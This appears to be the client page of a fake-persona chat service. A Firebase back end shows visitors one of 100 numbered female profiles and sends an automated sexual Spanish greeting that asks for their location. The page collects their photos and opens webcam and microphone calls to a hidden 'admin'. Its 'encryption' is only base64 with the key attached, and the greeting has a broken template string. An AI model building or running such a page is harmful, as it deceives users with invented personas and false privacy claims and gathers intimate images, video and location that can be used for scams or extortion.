<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>MENSAJES PRIVADOS</title>
  
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

  <style>
    /* Structure identique Ã  l'admin pour Ã©viter les chevauchements */
    body { 
      margin:0; 
      font-family:"Segoe UI",Arial,sans-serif; 
      background:linear-gradient(135deg,NavajoWhite,ivory,gray,khaki); 
      height:100vh; 
      display: flex;
      flex-direction: column;
      overflow:hidden; 
    }
    
    /* Header fixe */
    .chat-header { 
      display:flex; 
      align-items:center; 
      gap:12px; 
      padding:10px 15px; 
      background:linear-gradient(135deg,oldlace,purple,deeppink,gray,yellow); 
      color:black; 
      height: 70px;
      flex-shrink: 0;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2); 
      z-index: 10;
    }
    .chat-header img { width:45px; height:45px; border-radius:50%; object-fit:cover; border:2px solid green; }
    
    /* Zone de messages flexible (comme sur l'admin) */
    .chat-body { 
      flex: 1; 
      padding: 15px; 
      display: flex; 
      flex-direction: column; 
      gap: 12px; 
      overflow-y: auto; 
      background: transparent;
      padding-bottom: 20px;
      scroll-behavior: smooth;
      -webkit-overflow-scrolling: touch;
    }

    .msg { max-width:75%; padding:10px 14px; border-radius:15px; font-size:14px; word-wrap:break-word; position:relative; box-shadow:0 1px 3px rgba(0,0,0,0.2); line-height: 1.4; }
    .left { background:violet; align-self:flex-start; border-top-left-radius:0; color: black; }
    .right { background:salmon; align-self:flex-end; border-top-right-radius:0; color: linen; }
    .msg img { max-width:100%; border-radius:10px; display:block; margin-top:5px; }

    /* Input fixe en bas sans position:fixed pour ne pas cacher le contenu */
    .chat-input { 
      display:flex; 
      padding:10px; 
      background:black; 
      align-items:center; 
      gap: 8px;
      flex-shrink: 0;
      height: 65px;
    }
    .chat-input input { flex:1; padding:12px 15px; border-radius:25px; border:1px solid darkgray; outline:none; font-size: 16px; }
    .chat-input button { width:45px; height:45px; border:none; border-radius:50%; background:#25d366; color:white; font-size:18px; cursor:pointer; display:flex; justify-content:center; align-items:center; transition: 0.2s; }
    
    #localVideo, #remoteVideo { position:fixed; top:80px; right:10px; width:100px; border:2px solid Orange; border-radius:10px; display:none; z-index:100; background:black; }
  </style>
</head>
<body>

<div class="chat-header">
  <img id="profileImg" src="">
  <div style="flex:1">
    <h3 id="profileName" style="margin:0;font-size:16px;">Chargement</h3>
    <small id="profileId" style="opacity:0.8;font-size:11px;"></small>
  </div>
  <button id="callBtn" style="background:none; border:none; font-size:20px; cursor:pointer;">ðŸŽ¥</button>
</div>

<div class="chat-body" id="chatBody"></div>

<div class="chat-input">
  <button id="photoBtn" style="background:Olive; color:white;">ðŸ“·</button>
  <input type="text" id="textInput" placeholder="Escribe un mensaje....">
  <button id="sendBtn">âž¤</button>
  <input type="file" id="photoInput" accept="image/*" hidden>
</div>

<video id="localVideo" autoplay muted playsinline></video>
<video id="remoteVideo" autoplay playsinline></video>

<script>
// CONFIGURATION FIREBASE
const firebaseConfig = {
  apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
  authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
  projectId: "meet-ur-night-s-dominator",
  storageBucket: "meet-ur-night-s-dominator.firebasestorage.app",
  messagingSenderId: "1021669198456",
  appId: "1:1021669198456:web:31a62bb6003888060afb8d",
  measurementId: "G-SFPWNFM8PY",
  databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// PARAMÃˆTRES ET CLÃ‰S
const params = new URLSearchParams(location.search);
const imgNum = params.get("img") || "1";
const email = params.get("email") || "inconnu";
const userKeySafe = email.replace(/\./g, '_');
const convKey = imgNum + "_" + userKeySafe;
const secretKey = btoa(email + "_KEY_" + imgNum).slice(0,16);

// CRYPTAGE
function utf8_to_b64(str){ return btoa(unescape(encodeURIComponent(str))); }
function b64_to_utf8(str){ try{ return decodeURIComponent(escape(atob(str))); }catch(e){return str;} }
function encrypt(text, key){ return utf8_to_b64(key + "::" + text); }
function decrypt(cipher, key){ 
  try{ 
    let decoded = b64_to_utf8(cipher);
    return decoded.includes("::") ? decoded.split("::")[1] : decoded; 
  } catch(e){ return "Message protÃ©gÃ©"; } 
}

// PROFIL
const profils = { 1: "Alessia", 2: "Alice", 3: "Angela", 4: "Arianna", 5: "Aurora", 6: "Beatrice", 7: "Benedetta", 8: "Bianca", 9: "Camilla", 10: "Carla", 11: "Carlotta", 12: "Caterina", 13: "Chiara", 14: "Claudia", 15: "Cristina", 16: "Daniela", 17: "Deborah", 18: "Denise", 19: "Diana", 20: "Elena", 21: "Eleonora", 22: "Elisa", 23: "Elisabetta", 24: "Emma", 25: "Federica", 26: "Francesca", 27: "Gabriella", 28: "Gaia", 29: "Giada", 30: "Giulia", 31: "Giorgia", 32: "Ilaria", 33: "Isabella", 34: "Laura", 35: "Lavinia", 36: "Lea", 37: "Letizia", 38: "Lidia", 39: "Lorenza", 40: "Lucia", 41: "Lucrezia", 42: "Ludovica", 43: "Manuela", 44: "Mara", 45: "Margherita", 46: "Maria", 47: "Marianna", 48: "Martina", 49: "Matilde", 50: "Michela", 51: "Miriam", 52: "Monica", 53: "Nadia", 54: "Nicole", 55: "Nicoletta", 56: "Noemi", 57: "Paola", 58: "Patrizia", 59: "Rebecca", 60: "Roberta", 61: "Rosa", 62: "Rosalia", 63: "Sabrina", 64: "Samantha", 65: "Sara", 66: "Serena", 67: "Silvia", 68: "Simona", 69: "Sofia", 70: "Sonia", 71: "Stefania", 72: "Stella", 73: "Susanna", 74: "Teresa", 75: "Valentina", 76: "Valeria", 77: "Vanessa", 78: "Veronica", 79: "Viola", 80: "Virginia", 81: "Viviana", 82: "Agata", 83: "Anita", 84: "Antonella", 85: "Asia", 86: "Bruna", 87: "Carmen", 88: "Carina", 89: "Cinzia", 90: "Costanza", 91: "Dafne", 92: "Emanuela", 93: "Fiorella", 94: "Gabriela", 95: "Gemma", 96: "Iolanda", 97: "Lara", 98: "Melissa", 99: "Rosanna", 100: "Stefania" };

document.getElementById("profileImg").src = `IMAGE/img${imgNum}.jpg`;
document.getElementById("profileName").textContent = profils[imgNum] || "Profil";
document.getElementById("profileId").textContent = email;
// MISE Ã€ JOUR SESSION ADMIN
db.ref("active_sessions/" + convKey).update({
  name: profils[imgNum],
  userEmail: email,
  imgNum: imgNum, 
  status: "online",
  lastSeen: new Date().toLocaleString()
});

// FONCTION POUR REMONTER EN HAUT CHEZ L'ADMIN
function updateAdminSort() {
  db.ref("active_sessions/" + convKey).update({
    lastTimestamp: firebase.database.ServerValue.TIMESTAMP,
    lastFrom: "user"
  });
}

// GESTION DU CHAT
const chatBody = document.getElementById("chatBody");

function scrollBottom() {
  setTimeout(() => {
    chatBody.scrollTop = chatBody.scrollHeight;
  }, 100);
}

function renderSingleMessage(m) {
  const d = document.createElement("div");
  d.className = "msg " + (m.from === "admin" ? "left" : "right");
  const content = decrypt(m.message, secretKey);
  
  if (content.startsWith("data:image")) {
    d.innerHTML = `<img src="${content}">`;
  } else {
    d.textContent = content;
  }
  chatBody.appendChild(d);
  scrollBottom();
}

let welcomeTriggered = false;

db.ref("messages/" + convKey).on("child_added", (snap) => {
  const msgData = snap.val();
  renderSingleMessage(msgData);

  db.ref("messages/" + convKey).once("value", (allMsgs) => {
    if (allMsgs.numChildren() === 1 && msgData.from === "user" && !welcomeTriggered) {
      welcomeTriggered = true;
      const welcomeText ='Hola, cariÃ±o, Soy ${currentName} ! ðŸ«¦ RecibÃ­ tu escaneo. Mis servicios ya estÃ¡n disponibles para ti. Dime, Â¿quÃ© buscas esta noche? ðŸ¥µðŸ‘…Dime de dÃ³nde eres para poder ver tus alrededores.';
      setTimeout(() => {
        db.ref("messages/" + convKey).push({
          from: "admin",
          message: encrypt(welcomeText, secretKey),
          date: new Date().toLocaleString()
        });
      }, 1000);
    }
  });
});

// ENVOI TEXTE
document.getElementById("sendBtn").onclick = sendMessage;
document.getElementById("textInput").onkeypress = (e) => { if(e.key === "Enter") sendMessage(); };

function sendMessage() {
  const text = document.getElementById("textInput").value.trim();
  if(!text) return;
  db.ref("messages/" + convKey).push({
    from: "user",
    message: encrypt(text, secretKey),
    timestamp: firebase.database.ServerValue.TIMESTAMP
  }).then(updateAdminSort);
  document.getElementById("textInput").value = "";
  scrollBottom();
}

// ENVOI PHOTO
document.getElementById("photoBtn").onclick = () => document.getElementById("photoInput").click();
document.getElementById("photoInput").onchange = (e) => {
  const file = e.target.files[0];
  if(!file) return;
  const reader = new FileReader();
  reader.readAsDataURL(file);
  reader.onload = (event) => {
    const img = new Image();
    img.src = event.target.result;
    img.onload = () => {
      const canvas = document.createElement('canvas');
      const MAX_WIDTH = 1000;
      let w = img.width, h = img.height;
      if (w > MAX_WIDTH) { h *= MAX_WIDTH / w; w = MAX_WIDTH; }
      canvas.width = w; canvas.height = h;
      canvas.getContext('2d').drawImage(img, 0, 0, w, h);
      db.ref("messages/" + convKey).push({
        from: "user",
        message: encrypt(canvas.toDataURL('image/jpeg', 0.7), secretKey),
        timestamp: firebase.database.ServerValue.TIMESTAMP
      }).then(updateAdminSort);
      document.getElementById("photoInput").value = "";
    };
  };
};

// WEBRTC
let pc = null;
const iceConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

async function startCall(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
    document.getElementById("localVideo").srcObject = stream;
    document.getElementById("localVideo").style.display = "block";
    pc = new RTCPeerConnection(iceConfig);
    stream.getTracks().forEach(t => pc.addTrack(t, stream));
    pc.ontrack = e => {
      document.getElementById("remoteVideo").srcObject = e.streams[0];
      document.getElementById("remoteVideo").style.display = "block";
    };
    pc.onicecandidate = e => {
      if(e.candidate) db.ref("calls/"+convKey+"/candidates/user").push(JSON.stringify(e.candidate));
    };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    db.ref("calls/"+convKey).update({offer: JSON.stringify(offer), status: "calling"});
  } catch(err) { alert("no access"); }
}

document.getElementById("callBtn").onclick = startCall;
document.getElementById("textInput").addEventListener("focus", scrollBottom);
</script>
</body>
</html>
